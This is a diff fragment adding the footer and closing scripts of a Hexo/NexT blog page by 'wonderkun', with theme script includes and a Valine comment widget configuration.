+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+  <div class="beian"><a href="https://beian.miit.gov.cn/" rel="noopener" target="_blank">陕ICP备17014925号 </a>
+  </div>
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2024</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">wonderkun</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/fancybox/jquery.min.js"></script>
+  <script src="/lib/fancybox/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : true,
+      notify     : true,
+      appId      : 'T7sfFTnT9P1YS302SrmgIa3m-gzGzoHsz',
+      appKey     : 'WfIozMe5BYlmjQ5VMPJpu4G2',
+      placeholder: "ヾﾉ≧∀≦)o来啊，尽情吐槽啊!",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : true,
+      lang       : 'zh-cn' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
